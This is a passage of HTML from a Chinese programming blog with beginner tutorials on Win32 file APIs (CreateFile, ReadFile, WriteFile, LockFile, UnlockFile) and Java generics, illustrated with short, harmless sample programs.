class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		t[realRead] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;t;</span><br><span class="line">	&#125;<span class="keyword">while</span>(realRead == <span class="number">20</span>);</span><br><span class="line">	 </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>这个地方我们要注意我们的文件属性，要与你的文本属性相同！</strong><br>写文件的话呢其实也很简单：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,                    <span class="comment">// handle to file to write to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,                <span class="comment">// pointer to data to write to file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToWrite,     <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten,  <span class="comment">// pointer to number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped        <span class="comment">// pointer to structure for overlapped I/O</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数可以看出基本上是一模一样的，那我们还是看个小例子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					GENERIC_WRITE,<span class="comment">//要写这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					OPEN_EXISTING,<span class="comment">//打开文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD RealWrite;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">4</span>] = <span class="string">"aaa"</span>;</span><br><span class="line">	WriteFile(hFile,t,<span class="number">3</span>,&amp;RealWrite,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(RealWrite != <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail:"</span>&lt;&lt;RealWrite;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Write Success"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但在这个地方我们要注意，我们要写入的自己不需要带最后的00，他好像可以自己加上去。<br>PS：注意了！！！在用这个函数的时候，我们写完的时候，其实内容没有立马改变，而是写在了缓冲区中，Windows会找到合适的时机再写入磁盘的。<br>立即刷新的话呢，我们可以用<code>CloseHandle</code>或者使用比较有针对性的函数：<code>FlushFileBuffers</code>，参数都是一样的，最后一个是专门用来刷新缓冲区数据的。</p>
<h2 id="LockFile与UnlockFile"><a href="#LockFile与UnlockFile" class="headerlink" title="LockFile与UnlockFile"></a><code>LockFile</code>与<code>UnlockFile</code></h2><p>对于文件的安全性，防止文件在写入的过程中内容又被读取我们可以使用这两个函数，主要是对文件的缓冲区进行一定的保护作用，看一下这两个函数的一个定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加锁</span></span><br><span class="line"><span class="function">BOOL <span class="title">LockFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,           <span class="comment">// handle of file to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,  <span class="comment">// low-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,  <span class="comment">// high-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToLockLow,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// low-order word of length to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToLockHigh </span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// high-order word of length to lock</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解锁</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnlockFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,           <span class="comment">// handle of file to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,  <span class="comment">// low-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,  <span class="comment">// high-order word of lock region offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToUnlockLow,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// low-order word of length to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToUnlockHigh </span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="comment">// high-order word of length to unlock</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数基本一致那几个High的值很明显就是针对于特大文件的高32位的值，我们用NULL就可以了的，其他参数就是一个文件的加锁开始位置和加锁区域。<br>在这里需要注意的是，虽然我们的加锁文件结束进程的时候会自动解锁，但是这个还是最好显示的调用解锁函数避免我们有的时候文件无法正常的打开，而且Windows解锁文件的时间取决于当前可用的系统内存。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/24/File-operate/" data-id="ck5xij34w000de0wjg44lgx2f" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Windows-CreateFile" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/23/Windows-CreateFile/" class="article-date">
  <time datetime="2020-01-23T12:31:38.000Z" itemprop="datePublished">2020-01-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/23/Windows-CreateFile/">Windows-CreateFile</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>这个文件操作呢其实别叫泛，调用函数的类型其实是许多的，但是最强大的那个呢还是要数<code>CreateFile</code>了。来看一下MSDN的介绍吧：<br>The CreateFile function creates or opens the following objects and returns a handle that can be used to access the object: </p>
<ul>
<li>files </li>
<li>pipes </li>
<li>mailslots </li>
<li>communications resources </li>
<li>disk devices (Windows NT only) </li>
<li>consoles </li>
<li>directories (open only) </li>
</ul>
<p>控制台，通信资源，目录（只读打开），磁盘驱动器，文件，邮槽，管道。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpFileName,          <span class="comment">// pointer to name of the file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,       <span class="comment">// access (read-write) mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwShareMode,           <span class="comment">// share mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="comment">// pointer to security attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCreationDisposition,  <span class="comment">// how to create</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlagsAndAttributes,  <span class="comment">// file attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hTemplateFile         <span class="comment">// handle to file with attributes to </span></span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="comment">// copy</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*下面中文的一个简洁*/</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(LPCTSTR lpFileName, <span class="comment">//普通文件名或者设备文件名</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwDesiredAccess, <span class="comment">//访问模式（写/读）</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwShareMode, <span class="comment">//共享模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">//指向安全属性的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwCreationDisposition, <span class="comment">//如何创建</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwFlagsAndAttributes, <span class="comment">//文件属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE hTemplateFile <span class="comment">//用于复制文件句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>其实呢，复杂归复杂，但是有一些东西我们可能很少能用到，比如说按个安全属性，基本上用不到。</p>
<ol>
<li><code>lpFileName</code>这个参数其实就是类似于路径的一个东西，<ul>
<li>文件：文件的名称</li>
<li>串口：COM1为文件名</li>
<li>服务：\.\服务名称（.代表本地机器）</li>
<li>网络上其他主机文件：\主机名\共享目录名\文件名</li>
</ul>
</li>
<li><code>dwDesiredAccess</code>这个就是文件的打开方式<ul>
<li>标准控制权限(16-23位掩码)：</li>
<li>DELETE 删除对象的权限。</li>
<li>READ_CONTROL 从对象的安全描述符中读取信息的权限，但不包括SACL(系统访问控制列表)中的信息。</li>
<li>WRITE_DAC 修改对象安全描述符中的DACL(随机访问控制列表)的权限</li>
<li>WRITE_OWNER 修改对象安全描述符中的属主的权限</li>
<li>SYNCHRONIZE 同步化使用对象的权限，即可以创建一个线程等待信号量释放(但有些对象不支持这个权限)。</li>
<li>STANDARD_RIGHTS_REQUIRED 等价于前面四种权限的总合(通常这四种是必须具有的权限)。</li>
<li>STANDARD_RIGHTS_READ 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_WRITE 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_EXECUTE 一般等价于READ_CONTROL</li>
<li>STANDARD_RIGHTS_ALL 等价于前面五种权限的总合。</li>
<li>特殊控制权限(0-15位掩码)：</li>
<li>SPECIFIC_RIGHTS_ALL</li>
<li>ACCESS_SYSTEM_SECURITY</li>
<li>MAXIMUM_ALLOWED</li>
<li>GENERIC_READ</li>
<li>GENERIC_WRITE</li>
<li>GENERIC_EXECUTE</li>
<li>GENERIC_ALL</li>
<li>注：实质上是通过ACCESS_MASK结构体的一个双字值来设置标准权限、特殊权限和一般权限的。</li>
</ul>
</li>
<li><code>dwShareMode</code>这个参数就是共享的方式，百度上的解释：<ul>
<li>如果是零表示不共享； 如果是FILE_SHARE_DELETE表示随后打开操作对象会成功，但只有删除访问请求的权限；如果是FILE_SHARE_READ随后打开操作对象会成功只有请求读访问的权限；如果是FILE_SHARE_WRITE 随后打开操作对象会成功，但只有请求写访问的权限。</li>
</ul>
</li>
<li><code>lpSecurityAttributes</code>这个参数就是一个指向安全属性的一个指针，这个有点乱，我一般就填写NULL，这个就是默认。</li>
<li><code>dwCreationDisposition</code>这个参数文件的状态，主要是下面这几个常量：<ul>
<li>CREATE_NEW 创建文件；如文件存在则会出错</li>
<li>CREATE_ALWAYS 创建文件，会改写前一个文件</li>
<li>OPEN_EXISTING 文件必须已经存在。由设备提出要求</li>
<li>OPEN_ALWAYS 如文件不存在则创建它</li>
<li>TRUNCATE_EXISTING 将现有文件缩短为零长度</li>
</ul>
</li>
<li><code>dwFlagsAndAttributes</code>这个参数新建文件的属性和标志，也就是下面几个常量：<br>FILE_ATTRIBUTE_ARCHIVE 标记归档属性<br>FILE_ATTRIBUTE_COMPRESSED 将文件标记为已压缩，或者标记为文件在目录中的默认压缩方式<ul>
<li>FILE_ATTRIBUTE_NORMAL 默认属性</li>
<li>FILE_ATTRIBUTE_HIDDEN 隐藏文件或目录</li>
<li>FILE_ATTRIBUTE_READONLY 文件为只读</li>
<li>FILE_ATTRIBUTE_SYSTEM 文件为系统文件</li>
<li>FILE_FLAG_WRITE_THROUGH 操作系统不得推迟对文件的写操作</li>
<li>FILE_FLAG_OVERLAPPED 允许对文件进行重叠操作</li>
<li>FILE_FLAG_NO_BUFFERING 禁止对文件进行缓冲处理。文件只能写入磁盘卷的扇区块</li>
<li>FILE_FLAG_RANDOM_ACCESS 针对随机访问对文件缓冲进行优化</li>
<li>FILE_FLAG_SEQUENTIAL_SCAN 针对连续访问对文件缓冲进行优化</li>
<li>FILE_FLAG_DELETE_ON_CLOSE 关闭了上一次打开的句柄后，将文件删除。特别适合临时文件</li>
</ul>
</li>
<li><code>hTemplateFile</code>是个文件的模板，这个参数好像已经废掉了，写个NULL就可以了。</li>
</ol>
<p>返回值的话呢，就是一个文件的句柄，接受之后就可以对其操作了，也不只是文件句柄，很多的东西呢，之后再说。</p>
<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>为了方便起见，我就拿简单的读写文件进行演示吧，其他的都是放在后面说：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					GENERIC_WRITE,<span class="comment">//要写这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					CREATE_ALWAYS,<span class="comment">//创建文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//操作文件指针 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码简单易懂，看下就好了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/23/Windows-CreateFile/" data-id="ck5xij35z001me0wj2qch1ay7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-java-泛型2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/23/java-%E6%B3%9B%E5%9E%8B2/" class="article-date">
  <time datetime="2020-01-23T11:40:23.000Z" itemprop="datePublished">2020-01-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/23/java-%E6%B3%9B%E5%9E%8B2/">java-泛型2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><p>这个东西相对而言有点小复杂，这里的话呢简单介绍一些比较常用的方式。泛型的方法的话呢其实也就是在一个类中增加一个泛型的方法，看下面的示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">double</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi tCeshi = <span class="keyword">new</span> ceshi();</span><br><span class="line">		System.out.print(<span class="string">"值:"</span>+tCeshi.&lt;Double&gt;getString(a));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">getString</span><span class="params">(T a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，其实那个尖括号里面的类型就是用来定义参数类型的。<br>而且这里，静态方法需要再次声明，例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi &lt;Integer&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(a);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> T aT;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		System.out.print(a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就像是这个样子，静态方法需要再次定义。</p>
<h2 id="泛型可变参数方法"><a href="#泛型可变参数方法" class="headerlink" title="泛型可变参数方法"></a>泛型可变参数方法</h2><p>其实大同小异啦，主要还是要说一下是哪个类型：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">		ceshi &lt;Integer&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(a,<span class="number">500</span>,<span class="number">600</span>,<span class="number">900</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T... a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型上下边界"><a href="#泛型上下边界" class="headerlink" title="泛型上下边界"></a>泛型上下边界</h2><p>这个东西就是一个定义，其实也不难理解</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi &lt;Son&gt; tCeshi  = <span class="keyword">new</span> ceshi();</span><br><span class="line">		tCeshi.p(<span class="number">500</span>,<span class="number">600</span>,<span class="number">900</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span> &lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">fa</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(T... a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">fa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实仔细看看就是对于我们传入的类型界定一下。</p>
<h2 id="泛型数组"><a href="#泛型数组" class="headerlink" title="泛型数组"></a>泛型数组</h2><p>这个东西有点乱，看了一大顿也不是十分透彻，简单的总结一下。<br>1.不能和创建一个确切的泛型类型数组<br><img src="img1.jpg" alt="错误"><br>可以看到这个样子是不行的，<br>那么我们只能这个样子，使用通配符。<br>但是在最后，取出数据是要做显式的类型转换的。<br>但是我的JDK好像和网上的代码有冲突，这里就不贴图片了。！！！</p>
<p>最近冠状病毒肆虐，希望大家都能够注意健康，也快过年了，希望大家都平平安安的！！！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/23/java-%E6%B3%9B%E5%9E%8B2/" data-id="ck5xij36m001se0wj2sao6drf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Intent-Open-Activity3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/23/Intent-Open-Activity3/" class="article-date">
  <time datetime="2020-01-23T09:05:09.000Z" itemprop="datePublished">2020-01-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/23/Intent-Open-Activity3/">Intent Open Activity3</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
